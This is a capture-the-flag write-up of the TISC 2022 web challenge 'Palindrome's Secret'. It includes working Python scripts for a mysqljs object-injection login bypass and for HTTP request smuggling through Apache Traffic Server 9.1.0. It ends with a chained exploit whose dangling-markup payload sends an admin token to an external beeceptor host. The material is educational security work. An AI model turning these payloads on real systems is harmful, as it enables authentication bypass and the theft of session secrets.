---
title: "TISC 2022 Web Palindrome's Secret"
date: 2022-09-12T00:05:00+08:00
draft: false
tags:
    - ctf
    - tisc-2022
    - web
    - nodejs
    - express
    - mysql
    - traffic-server
    - proxy
    - sqli
    - http-request-smuggling
    - dangling-markup-injection
    - html-injection
categories:
    - ctf
    - writeup
    - tisc-2022
---

## Palindrome's Secret Challenge Description
This was a Web challenge unlocked at level 5 that was part of the recent [TISC 2022](https://www.csit.gov.sg/events/tisc/tisc-2022) CTF organised by [CSIT](https://www.csit.gov.sg/). TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge.

## Introduction
Palindrome's Secret was an interesting web challenge that had 3 parts to it, an SQL Injection through parameterized queries, [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling) and finally a [Dangling Markup Injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup). IMO, the HTTP Request Smuggling exploit was the most interesting hack that I learned through this CTF and definitely worth a writeup.

## Studying the Web Application & Source Code
If we analyzed the `docker-compose.yml` file for the web application, we would notice that there are 4 services in total.

```docker
version: "3"
services:
  app:
    build: ./app
    privileged: true
    restart: always
    environment:
      - MYSQL_PASSWORD=REDACTED                   # NOT THE REAL PASSWORD
      - ADMIN_TOKEN=TISC{0:1:2:3:4:5:6:6:8:9}     # NOT THE REAL FLAG
      - EMAIL=REDACTED@REDACTED                   # NOT THE REAL EMAIL
      - PASSWORD=REDACTED                         # NOT THE REAL PASSWORD
      - BASE_URL=http://localhost:8000

  proxy:
    build: ./proxy
    restart: always
    ports:
      - 80:8080

  db:
    image: mysql
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=REDACTED              # NOT THE REAL PASSWORD
      - MYSQL_DATABASE=palindrome
    volumes:
      - ./mysql-init:/docker-entrypoint-initdb.d
    
  redis:
    image: redis
    restart: always

```

Right of the bat I noticed 3 key pieces of information:
- There is a `mysql` database that's exposed as the `db` service
- Only the `proxy` service is exposed publicly
- The flag is stored in an environment variable in the `app` service as `ADMIN_TOKEN`

Playing around with the web application, I realised that there was no way I could navigate to any other resources and I always got redirected to the login service. This is where I started to suspect an SQL Injection as the first step to this challenge.

The `db` service had nothing interesting so I started of by studying the application's `main.js` source code and its routes:

```javascript
const mysql = require('mysql')

const express = require('express')
const session = require('express-session')

//** Omitted **//

const db = mysql.createConnection({
    host     : 'db',
    user     : 'web',
    password : process.env.MYSQL_PASSWORD,
    database : 'palindrome'
});

//** Omitted **//

const app = express()
const port = 8000
```

So, we have an `express` application running on port 8000 that uses `mysql` as the backend database (as we saw earlier from the `docker-compose.yml` file).

```javascript
// Application Routes
app.get     ('/login', getLoginHandler)
app.post    ('/login', postLoginHandler)

app.get     ('/index', authenticationMiddleware, indexHandler)
app.get     ('/token', authenticationMiddleware, getTokenHandler)
app.post    ('/token', authenticationMiddleware, postTokenHandler)
app.get     ('/verify', authenticationMiddleware, tokenVerifyHandler)
app.get     ('/report-issue', authenticationMiddleware, reportIssueHandler)
app.post    ('/do-report', authenticationMiddleware, doReportHandler)
app.all     ('/forbidden', authenticationMiddleware, forbiddenHandler)
```

More importantly, based on the above routing information, our theories are confirmed, that no matter which endpoint is passed in, the `authenticationMiddleware` would always be processed first. So let's take a look at what `authenticationMiddleware` does:

```javascript
const authenticationMiddleware = async (req, res, next) => {
    if (req.session.userId) {
        if (req.ip === '127.0.0.1')
            req.session.token = process.env.ADMIN_TOKEN 

        next()
    }
    else 
        return res.redirect('/login')
}
```

Ahhh, it seems like we have 2 very key pieces of information here:
- If `req.session.userId` is not set, the application redirects the user to the `/login` endpoint.
- If the `req.ip` is `127.0.0.1`, the `req.session.token` is set to the `ADMIN_TOKEN`, which as we saw earlier, is the flag.

Let's ignore the second part for now and focus on how to set a `req.session.userId`. If we did a search on the `main.js`, we would realise that the only other place `req.session.userId` is mentioned is in the `postLoginHandler`, so lets take a look at that:

```javascript
const postLoginHandler = async (req, res) => {
    const { email, password } = req.body
    if (!email || !password)
        return res.status(400).send({ message: 'Missing email or password' })

    const rows = await query(`SELECT * FROM users WHERE email = ? AND password = ?`, [email, password])
    if (rows.length === 0)
        return res.status(401).send({ message: 'Invalid email or password' })

    req.session.userId = rows[0].id
    return res.status(200).send({ message: "Success" })
}
```
## SQL Injection through Query Parameterization

Hmmm, based on the previous section it seems like we have [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html), which should TECHNICALLY protect us from SQLi, or does it?

I did a bit of digging around and eventually came across [an article](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) that was referenced from [this article](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/), which describes the exact scenario we are facing, an `express` application that does parameterized queries. 

In short, the article describes that "due to certain specifications in `express`, one can pass in to the parameters a different value type like an `Object`, `Boolean` or an `Array`".

To elaborate further, this means that we can pass in an `Object` like a JSON object instead of the expected `String` into the `username` or `password` field. In other words, instead of:

```bash
{
    "email":"email@email.com",
    "password":"password""
}
```

We can instead pass in a javascript object to of the fields and `express` would interpret it as a valid SQL statement.

```bash
{
    "email":{"email":1},
    "password":{"password":1}
}
```

On `mysql`'s side, the SQL statement would be interpreted like this:

```sql
SELECT * FROM users WHERE email = `email` = 1 AND password = `password` = 1;
```
and because ``email = `email` `` and ``password = `password` `` both evaluates to `1`, which evaluates to the following:

```sql
SELECT * FROM users WHERE 1 = 1 AND 1 = 1;
```

and finally, `mysql` evaluates the following:

```sql
SELECT * FROM users;
```

Notice that in the `postLoginHandler` code a `401` is returned only if the number of rows returned by `mysql` is 0:

```javascript
if (rows.length === 0)
    return res.status(401).send({ message: 'Invalid email or password' })

req.session.userId = rows[0].id
return res.status(200).send({ message: "Success" })
```

Thankfully enough, there is only one user that is registered in the database as seen in in `mysql-init/init.sql` file:

```sql
INSERT INTO `users` (`email`, `password`) VALUES ("REDACTED@REDACTED", "REDACTED");
```
Here's a script that I used to authenticate and print a cookie that can be used for the other parts of this challenge:

```python
import requests
import json

url = "http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627"
body = {"email": {"email":1},
        "password": {"password":1}
        }
login_url = f"{url}/login"
r = requests.post(login_url, json=body)

for c in r.cookies:
    if c.name == "connect.sid":
        print(c.name, c.value)
```

I ran the script to get a cookie:

```bash
└─$ python3 login.py
connect.sid s%3AZtg1Ilaj_1kRPexPD2nopZUCN0SF_GIF.ESM4lx5LkmWvf57fvccsa%2Bh8ADOVPGLGZO1Sh4YMidg
```

I put it in the browser and success, I have bypassed the authentication system and can successfully navigate to other parts of the web application!

![Login-Bypass](/images/posts/tisc-2022-level5-login-bypass.PNG)

## HTTP Request Smuggling

Let's go back and take a look at our `authenticationMiddleware` again:

```javascript
const authenticationMiddleware = async (req, res, next) => {
    if (req.session.userId) {
        if (req.ip === '127.0.0.1')
            req.session.token = process.env.ADMIN_TOKEN 

        next()
    }
    else 
        return res.redirect('/login')
}
```

It seems like in order to set the `req.session.token` as the FLAG, we would have to make a request from `127.0.0.1`. The first thing that stood out to me was the `POST /do-report` endpoint, which when you attempt to make a request to it externally, it returns a `403 forbidden`.

I guess it's time to take a deeper look at the `proxy` service itself! Let's first inspect the proxy software being used from the `Dockerfile` itself:

```docker
FROM ubuntu:20.04
RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get upgrade -y
RUN DEBIAN_FRONTEND=noninteractive apt-get install -y curl build-essential libssl-dev libpcre3-dev zlib1g-dev
WORKDIR /ats
RUN curl -L https://archive.apache.org/dist/trafficserver/trafficserver-9.1.0.tar.bz2 > ats.tar.bz2 && \
    tar xf ats.tar.bz2 && \
    cd trafficserver-9.1.0 && \
    ./configure --prefix=/opt/ts && \
    make && \
    make install

COPY remap.config /opt/ts/etc/trafficserver/remap.config
RUN chmod +r /opt/ts/etc/trafficserver/remap.config

CMD ["/opt/ts/bin/traffic_manager"]
```

Alright, it seems like we're using Apache Traffic Server 9.1.0 as the proxying software.

Let's inspect the `remap.config` configuration file for it:

```config
map             /login          http://app:8000/login
map             /index          http://app:8000/index
map             /token          http://app:8000/token
map             /verify         http://app:8000/verify
map             /report-issue   http://app:8000/report-issue
map             /static         http://app:8000/static
map             /do-report      http://app:8000/forbidden
regex_redirect  http://(.*)/    http://$1/index
```

Indeed, as we can see from the config file any requests to `do-report` gets redirected to `/forbidden`.

At this point I started thinking, what can one do assumming a request to `POST /do-report` can be made? In `docker` environments, it is possible to directly `exec` into a container and run commands from it. Let's start running our application locally!

We first run the entire application with `docker-compose up -d`

We can then list out the available docker containers with `docker ps -a`:

```bash
└─$ docker ps -a                      
CONTAINER ID   IMAGE           COMMAND                  CREATED      STATUS       PORTS                                   NAMES
7c623c1e94c5   mysql           "docker-entrypoint.s…"   4 days ago   Up 2 hours   3306/tcp, 33060/tcp                     distrib_db_1
455383c8aaf4   distrib_app     "/usr/bin/dumb-init …"   4 days ago   Up 2 hours                                           distrib_app_1
18b75193db78   distrib_proxy   "/opt/ts/bin/traffic…"   4 days ago   Up 2 hours   0.0.0.0:80->8080/tcp, :::80->8080/tcp   distrib_proxy_1
586b3eb5af97   redis           "docker-entrypoint.s…"   4 days ago   Up 2 hours   6379/tcp  
```

In this case, we are interested in the `distrib_app_1` container. Let's `exec` into it using `docker exec -it distrib_app_1 bash`.

Let's try making a request to the `GET /token` endpoint using curl:

```bash
└─$ docker exec -it distrib_app_1 bash
inmate@455383c8aaf4:~/app$ curl -i -X POST --url "http://localhost:8000/login" -H "Content-Type: application/json" --data '{"email":{"email":1}, "password":{"password":1}}'
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
Cross-Origin-Opener-Policy: same-origin
Content-Type: application/json; charset=utf-8
Content-Length: 21
ETag: W/"15-uFFjCr0SbbbFb/CsC0M2sF++swo"
Set-Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI; Path=/; Expires=Mon, 12 Sep 2022 19:00:24 GMT; HttpOnly
Date: Sun, 11 Sep 2022 19:00:24 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Success"}
```

```bash
inmate@455383c8aaf4:~/app$ curl --url "http://localhost:8000/token" -H "Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI;"
#### Omitted ####
<p>Your token is TISC{0:1:2:3:4:5:6:6:8:9}</p></p></div>
```

Woah woah woah, our (fake) flag is actually in the response! So it seems like a potential attack pattern would be to:
- Using the `POST /do-report`, make a request to `GET /token`

Let's go ahead and make a request to `POST /do-report` from within the docker container, while using that authenticated cookie.

```bash
inmate@455383c8aaf4:~/app$ curl -X POST --url "http://localhost:8000/do-report" -H "Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI;" -H "Content-Type: application/json" -d '{"url":"http://localhost:8000/token"}'
OK
```

Huh.... we only get one `OK`, which is not exactly very useful. Let's look at the logs of the container:

```
└─$ docker logs --follow distrib_app_1
[*] Listening on port 8000
[INFO] Starting browser
[*] Visiting http://localhost:8000/token
[*] Done visiting http://localhost:8000/token

```

Okay, it seems like there was an attempt to visit the `GET /token` endpoint through a browser.

Let's study the source code of the `doReportHandler` portion a little bit more, which we can find in `report.js`.

```javascript
const doReportHandler = async (req, res) => {

    if (!browser) {
        console.log('[INFO] Starting browser')
        browser = await puppeteer.launch({
            headless: false,
            args: [
                "--no-sandbox",
                "--disable-background-networking",
                "--disk-cache-dir=/dev/null",
                "--disable-default-apps",
                "--disable-extensions",
                "--disable-desktop-notifications",
                "--disable-gpu",
                "--disable-sync",
                "--disable-translate",
                "--disable-dev-shm-usage",
                "--hide-scrollbars",
                "--metrics-recording-only",
                "--mute-audio",
                "--no-first-run",
                "--safebrowsing-disable-auto-update",
                "--window-size=1440,900",
            ]
        })
    }

    const url = req.body.url
    if (
        url === undefined ||
        (!url.startsWith('http://') && !url.startsWith('https://'))
    ) {
        return res.status(400).send({ error: 'Invalid URL' })
    }

    try {
        console.log(`[*] Visiting ${url}`)
        await visit(url)
        console.log(`[*] Done visiting ${url}`)
        return res.sendStatus(200)
    } catch (e) {
        console.error(`[-] Error visiting ${url}: ${e.message}`)
        return res.status(400).send({ error: e.message })
    }
}
```

Hmmm, a `puppeteer` browsing, which kind of suggests some potential Cross-Site Scripting exploit? But let's ignore this for now and focus on what `visit` is doing:

```javascript
const visit = async (url) => {
    const ctx = await browser.createIncognitoBrowserContext()
    const page = await ctx.newPage()

    await page.goto(LOGIN_URL, { timeout: 5000, waitUntil: 'networkidle2' })
    await page.waitForSelector('form')
    await page.type('input[name=email]', process.env.EMAIL)
    await page.type('input[name=password]', process.env.PASSWORD)
    await page.click('button[type="submit"]')
    await page.waitForTimeout(1000)

    try {
        await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' })
        await page.waitForTimeout(1000)
    } finally {
        await page.close()
        await ctx.close()
    }
}
```

Ahhhh, okay so to put it in layman terms, `report.js` is doing the following:
- `visit` logs the browser into the application with the pre-defined credentials stored in environment variables as seen in the `docker-compose.yml` earlier.
- This means that the browser visits the passed-in `url` from the context of an authenticated admin user when this is performed through the `POST /do-report` endpoint.

Let's for now, focus trying to make a request to the `POST /do-report` endpoint. After some research I came across this [HTTP Request Smuggling vulnerability for nodejs](https://security.snyk.io/vuln/SNYK-ALPINE316-NODEJSCURRENT-2953122) and with more googling around I eventually came across this [CVE](https://lists.apache.org/thread/rc64lwbdgrkv674koc3zl1sljr9vwg21) for the Apache Traffic Server 9.1.0 (which turns out to be similar to [SEETF 2022's](https://ctftime.org/event/1543) flagportal revenge challenge).

Okay, so it seems like this challenge wants us to perform a HTTP Request Smuggling attack in order to bypass the proxy whitelist (as defined in the `remap.config`) and make a `POST /do-report` request directly through the application container itself.

### Abusing Improper Chunk Extension Validations
Let's first understand the conditions necessary for this HTTP Request Smuggling to work:
- Apache Traffic Server 9.1.0 processe Line Feed (LF) (`\n`) as line endings instead of Carriage Return Line Feed (CRLF) (`\r\n`).
- `lhttp` in NodejS v16.3.0 doesn't parse chunk extensions properly, but ignores every byte until a (CR) `\r` is reached.


```bash 
GET /login HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

2 ; xx
f2
0

POST /do-report HTTP/1.1
Host: app:8000
Content-Type: application/json
Content-Length: 37
Cookie: connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8

{"url":"http://localhost:8000/token"}

0

```

*If you're not familiar with how [Chunked Transfer Encoding](https://en.wikipedia.org/wiki/Chunked_transfer_encoding) works, I do suggest you read up about it a little before carrying on with the rest of this writeup*

Let's try to understand what is happening. In the example above, `; xx` is treated as the [chunk extension](https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1) and `2` is intrepreted as the chunk size.

Now, because ATS does not treat CRLF as the line ending but instead it treats LF as the line ending, we can modify the chunked extension to a payload like `\nxx` and as a result, ATS would see the following request:

```bash
GET /login HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

2 \nxx
f2
0

POST /do-report HTTP/1.1
Host: app:8000
Content-Type: application/json
Content-Length: 37
Cookie: connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8

{"url":"http://localhost:8000/token"}

0

``` 

From ATS' perspective, it only sees a single request to `GET /login` and because of the first `0\r\n` (AKA the final byte indicator for chunked transfer encoding) ATS does not see beyond that.

On the other hand, NodeJS actually sees both requests, the first request to `GET /login` as well as the second smuggled request, to `POST /do-report`. 

`2 \nxx` actually gets ignored by NodeJS due to the lack of `\r` character and because of that, it ends up treating `f2` as the chunk size. We can then do some calculations to correctly pass in the correct chunk size to be interpreted by the NodeJS server.

Finally, here's a python script that I used to generate the final payload to perform the request smuggling.

```python
import sys

body = b'{"url":"http://localhost:8000/token"}'
cookie = b"connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8"

smuggled = (
    b"POST /do-report HTTP/1.1\r\n" +
    b"Host: app:8000\r\n" +
    b"Content-Type: application/json\r\n" +
    b"Content-Length: " + str(len(body)).encode() + b"\r\n" +
    b"Cookie: " + cookie + b"\r\n" +
    b"\r\n" +  
    body + b"\r\n"
    b"\r\n" + 
    b"0\r\n" +
    b"\r\n"
)

def h(n):
    return hex(n)[2:].encode()

smuggled_len = h(len(smuggled) - 7 + 5)

first_chunk_len = h(len(smuggled_len))

sys.stdout.buffer.write(
    b"GET /login HTTP/1.1\r\n" +
    b"Host: localhost\r\n"+
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    first_chunk_len + b" \n" + 
    b"x"*len(smuggled_len) + b"\r\n" +
    smuggled_len + b"\r\n" +
    b"0\r\n" +
    b"\r\n" +
    smuggled
)

```

I ran the script locally by running `python3 hrs.py | nc localhost 80`. We can verify that a request to `do-report` was made by inspecting the docker container logs (or alternatively point the `url` parameter in the `POST /do-report` endpoint to a self-controlled domain and inspect the request made).

```bash
└─$ docker logs --follow distrib_app_1
[*] Visiting http://localhost:8000/token
[*] Done visiting http://localhost:8000/token
```

*Credits to [zeyu2001](https://www.zeyu2001.com/) for the solution writeup on [flagportal revenge](https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2022/web/flagportal-revenge/solve.md), which helped me understand the whole HRS much better! Do checkout his website and his other writeups too :)*

## Data Exfiltration via Dangling Markup Injection
Okay, we have found a way to externally trigger the `POST /do-report` endpoint, but how do we exfiltrate the `req.session.token` data? Remember earlier on when we noticed the use of `puppeteer` and the potential idea of an XSS? Let's look at that!

After some digging around, it seems like the `GET /token?token=<token>` endpoint has unsanitized reflected input when generating a token through `POST /token`.

Initially I tried injecting XSS payloads but all of which seemed to not execute, making me realise that an XSS was (probably) not possible.

I decided to analyse the `Content-Security-Policy` to understand further and voila, a realisation!

```javascript
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
    )
    res.setHeader(
        'Cross-Origin-Opener-Policy',
        'same-origin'
    )
    next()
})
```

Hmmm, turns out the CSP does indeed allow the loading of external image sources. I started looking around for other forms of **non-xss** client based attacks and eventually I came across [Dangling Markup Injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup), which seemed rather promising.

I tried to generate a token with the `username` payload, using [beeceptor](https://beeceptor.com/) as a way to inspect my request. If the image does load a request would be triggered to my temporary `beeceptor` endpoint.

```html
"/><img src="https://test-dangling-markup.free.beeceptor.com?
```

And success! I can see the a request being triggered and the query parameter in my `beeceptor` endpoint contains the exfiltrated response to the `GET /token?token=<generated_token>` endpoint as follows:

```json
{
  " asks for your token, you can give them this token: TISC{a:q:a:c:n:s:w:g:o:4}.</div><form action": ""
}
```

Let's make a script and automate this part!

```python
import requests
import json

url = "http://localhost"
login_endpoint = f"{url}/login"
token_endpoint = f"{url}/token"
verify_endpoint = f"{url}/verify"

login_payload = {"email": {"email":1}, "password": {"password":1}}

r_login = requests.post(login_endpoint, json=login_payload)

cookie = ""

for c in r_login.cookies:
    if c.name == "connect.sid":
        cookie = f"{c.name}={c.value}"

headers = {"Cookie": cookie}
token_payload = {"username":"\"/><img src=\"https://test-dangling-markup.free.beeceptor.com?"}
r_token = requests.post(token_endpoint, json=token_payload, headers=headers)
print(r_token.json().get("token"))
```

## Putting it all together

In the above sections we have demonstrated the following vulnerabilities:
- An SQL Injection through improper type checking in `POST /login`
- HTTP Request Smuggling to bypass ATS proxy, thus allowing a request to `POST /do-report`
- A Dangling Markup Injection through `POST /token` and reflected in `GET /verify?token=<token>`

Our attack pattern would involve the following:
1. Retrieve an authentication cookie by exploiting the SQLi vulnerability
2. Generate a token, injecting a dangling markup injection payload through the `username` parameter.
3. Exploiting the HTTP Request Smuggling, make a request to the `POST /do-report` endpoint and pass in the `url` parameter the `GET /verify?token=<token_generated_in_step_2>`.

Let's go ahead and automate the whole process with a script:

```python
import requests
import json
import sys
import urllib.parse

domain = "chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627"
url = f"http://{domain}"
login_endpoint = f"{url}/login"
token_endpoint = f"{url}/token"
verify_endpoint = f"{url}/verify"

login_payload = {"email": {"email":1}, "password": {"password":1}}

## Login Stuff
r_login = requests.post(login_endpoint, json=login_payload)

cookie = ""

for c in r_login.cookies:
    if c.name == "connect.sid":
        cookie = f"{c.name}={c.value}"

## Generate dangling markup injection token
headers = {"Cookie": cookie}
token_payload = {"username":"\"/><img src=\"https://test-dangling-markup.free.beeceptor.com?"}
r_token = requests.post(token_endpoint, json=token_payload, headers=headers)
bad_token = urllib.parse.quote(r_token.json().get("token"))

## Perform HTTP Request Smuggling

body = '{"url":"http://localhost:8000/verify?token=' + bad_token + '"}'
body = body.encode()
cookie = cookie.encode()

smuggled = (
    b"POST /do-report HTTP/1.1\r\n" +
    b"Host: app:8000\r\n" +
    b"Content-Type: application/json\r\n" +
    b"Content-Length: " + str(len(body)).encode() + b"\r\n" +
    b"Cookie: " + cookie + b"\r\n" +
    b"\r\n" +  
    body + b"\r\n"
    b"\r\n" + 
    b"0\r\n" +
    b"\r\n"
)

def h(n):
    return hex(n)[2:].encode()

smuggled_len = h(len(smuggled) - 7 + 5)

first_chunk_len = h(len(smuggled_len))

sys.stdout.buffer.write(
    b"GET /login HTTP/1.1\r\n" +
    b"Host: " + domain.encode() + b"\r\n" + 
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    first_chunk_len + b" \n" + 
    b"x"*len(smuggled_len) + b"\r\n" +
    smuggled_len + b"\r\n" +
    b"0\r\n" +
    b"\r\n" +
    smuggled
)

```

And now if we were to inspect our mock endpoint on `beeceptor`, we would see the flag in the query parameter as follows!: 

```json
{
  " asks for your token, you can give them this token: TISC{1:3:3:7:l:3:4:k:1:n}.</div><form action": ""
}
```

## Wrapping it all up like a burrito
If you're reading this, thank you for reading this whole writeup! I personally had a lot of fun learning about these interesting forms of web vulnerabilities and I finally had a chance to exploit a HTTP Request Smuggling vulnerability...

Okay technically I had that chance during SEETF2022 as well but I was busy learning about exploiting smart-contracts. Do check out my [SEETF2022 write-ups](https://quentinkhoo.github.io/tags/seetf-2022/) as well!

Also if anything, I learned that parameterized queries does not ALWAYS protect you from an SQL Injection.....hmmm interesting, and yea, XSS is NOT the only form of client-side attack.

Shoutout to [CSIT](https://www.csit.gov.sg/) for organising this CTF, and do check out my other [TISC-2022 writeups](https://quentinkhoo.github.io/tags/tisc-2022/) too! :)